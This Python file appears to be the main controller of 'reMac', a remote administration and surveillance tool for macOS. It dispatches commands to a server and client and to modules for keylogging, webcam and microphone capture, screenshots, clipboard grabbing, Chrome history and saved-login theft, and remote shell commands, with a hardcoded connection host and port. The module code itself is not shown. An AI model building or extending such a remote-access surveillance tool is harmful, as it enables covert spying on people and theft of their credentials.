import sys, getopt
import os

from apps import reMac_server
from apps import reMac_client

from modules import mod_hello
from modules import mod_clipboard
from modules import mod_chrome_history
from modules import mod_chrome_logins
from modules import mod_shellcmd
from modules import mod_screenshot
from modules import mod_webcam
from modules import mod_keylogger
from modules import mod_recmic
from modules import mod_modHelp

myreMac_server = reMac_server.reMac_server()
myreMac_client = reMac_client.reMac_client()

reMacModules = {
    'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
    'cb': [mod_clipboard.mod_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
    'ch': [mod_chrome_history.mod_chrome_history(), 'chromehist', 'Call Chrome-History module', 'ch'],
    'cl': [mod_chrome_logins.mod_chrome_logins(), 'chromelogin', 'Call Chrome-Logins module', 'cl'],
    'sh': [mod_shellcmd.mod_shellcmd(), 'shellcmd', 'Call shell command module', 'sh <cmd to send>'],
    'sc': [mod_screenshot.mod_screenshot(), 'screenshot', 'Call screenshot module', 'sc'],
    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc'],
    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module', 'kl'],
    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm <seconds to record>'],
    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>']
}

authorName = "JeteDonner"
appVer = "0.0.1"
appName = "reMac"
appDesc = "Remote administration and surveillance for macOS - With Python"
appDate = "2021-08-18"
conHost = "192.168.0.49"
conPort = "6890"

# clientStarted = False

def print_client_help():
    print(f'#========================================================================#')
    print(f'| {appName} - Client Command-Help:')
    # print(f'| Created by: {authorName}, v.{appVer} {appDate}')
    for keyTmp in list(reMacModules):
        altCmd = reMacModules[keyTmp]
        print(f'| -{keyTmp} / {altCmd[1]}: {altCmd[2]}')
    print(f'#========================================================================#')

def print_help():
    print(f'#========================================================================#')
    print(f'| {appName} - {appDesc} |')
    print(f'| Created by: {authorName}, v.{appVer} {appDate}                             |')
    print(f'|                                                                        |')
    print(f'| Script usage / parameters:                                             |')
    print(f'| -help, -h\t\t\tDisplay this help text                               |')
    print(f'| -server, -s\t\tStart the server                                     |')
    print(f'| -client, -c\t\tStart the server                                     |')
    print(f'| -dev, -d\t\t\tStart developer mode                                 |')
    print(f'#========================================================================#')


def processInput(input):

    # if clientStarted == True:
    #     myreMac_client.start_client(input)
    #     return

    if input == "q":# or input == "quit":
        sys.exit(1)
    elif input == "h":# or input == "help":
        print_help()
    elif input == "hw":  # or input == "help":
        reMacModules[input][0].run_mod()
    elif input == "s":# or input == "help":
        myreMac_server.start_server()
    elif input == "hh":  # or input == "help":
        print_client_help()
    elif input == "c":# or input == "help":
        myreMac_client.start_client()
        global clientStarted
        clientStarted = True
    elif input == "kl":# or input == "help":
        reMacModules[input][0].run_mod()
    elif input == "cb":# or input == "clipboard":
        if clientStarted == True:
            myreMac_client.start_client("cb")
            pass
        else:
            reMacModules[input][0].run_mod()
    elif input == "ch":# or input == "chromeHistory":
        if clientStarted == True:
            myreMac_client.start_client(input)
            pass
        else:
            reMacModules[input][0].run_mod()
    elif input == "cl":# or input == "chromeLogins":
        reMacModules[input][0].run_mod()
    elif input == "sh":# or input == "shell":
        reMacModules[input][0].run_mod()
    elif input == "sc":# or input == "screenshot":
        reMacModules[input][0].run_mod()
    elif input == "wc":# or input == "screenshot":
        reMacModules[input][0].run_mod()
    elif input == "rm":  # or input == "screenshot":
        reMacModules[input][0].run_mod()
    elif input.startswith("mh"):  # or input == "screenshot":
        if clientStarted == True:
            myreMac_client.start_client(input)
            pass
        else:
            reMacModules["mh"][0].print_client_help(appName, reMacModules, input)
    elif input == "d" or input == "dev":
        reMacModules['sc'][0].run_mod()
    else:
        print(f"Command '{input}' NOT FOUND! Check the following command list")
        print_help()

def enterWaitForInput(argv):
    while True:
        c = input("Select your option and press enter:")
        processInput(c.lower())

if __name__ == "__main__":
    # print(f'Number of arguments:', len(sys.argv), 'arguments.')
    if len(sys.argv) == 1:
        print_help()
        enterWaitForInput(sys.argv)
    # else:
    #     main(sys.argv[1:])